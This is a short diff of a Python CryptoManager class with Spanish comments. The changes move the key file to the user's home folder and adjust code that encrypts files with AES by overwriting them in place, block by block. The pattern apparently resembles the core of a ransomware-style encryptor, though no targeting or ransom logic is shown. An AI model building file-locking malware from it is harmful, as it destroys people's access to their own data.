@@ -1,4 +1,4 @@
-import hashlib, random, socket, os
+import hashlib, random, socket, os, sys
 from Crypto.Util import Counter
 from Crypto.Cipher import AES
 
@@ -14,7 +14,9 @@ class CryptoManager:
         return key
 
     def save_key_to_file(self):
-        key_file_path = os.path.join(os.path.dirname(__file__),'..','key')  # Ruta al archivo "key" en el directorio raíz
+        home_directory = os.path.expanduser("~")
+        key_file_path = os.path.join(home_directory, 'key')  # Archivo 'key' en la carpeta de inicio
+
         with open(key_file_path, 'w') as key_file:
             key_file.write(self.key)  # Guarda la clave en el archivo
 
@@ -23,7 +25,7 @@ class CryptoManager:
             unencrypted_content = file.read(block_size)
             while unencrypted_content:
                 encrypted_content = crypto(unencrypted_content)
-                file.seek(- len(unencrypted_content), 1)
+                file.seek(-len(unencrypted_content), 1)
                 file.write(encrypted_content)
                 unencrypted_content = file.read(block_size)
 
